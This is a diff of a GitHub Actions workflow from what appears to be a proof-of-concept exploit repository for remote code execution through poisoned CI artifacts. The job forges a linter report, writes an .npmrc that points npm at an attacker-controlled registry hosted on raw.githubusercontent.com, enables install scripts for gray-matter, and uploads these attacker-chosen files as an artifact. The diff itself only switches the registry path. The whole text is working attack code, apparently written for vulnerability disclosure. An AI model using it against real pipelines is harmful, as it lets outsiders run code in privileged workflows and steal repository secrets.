@@ -17,7 +17,7 @@ jobs:
         run: |
           printf 'FORGED REPORT\n' > linter-report.txt
           echo "$PR_NUMBER" > pr-number.txt
-          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-postlint-rce/main/npmreg/\naudit=false\nfund=false\nprogress=false\n' > .npmrc
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-postlint-rce/main/npmreg2/\naudit=false\nfund=false\nprogress=false\n' > .npmrc
           printf '%s\n' '{"name":"poc-project","version":"1.0.0","allowScripts":{"gray-matter":true}}' > package.json
 
       - name: Upload artifact with attacker-chosen files
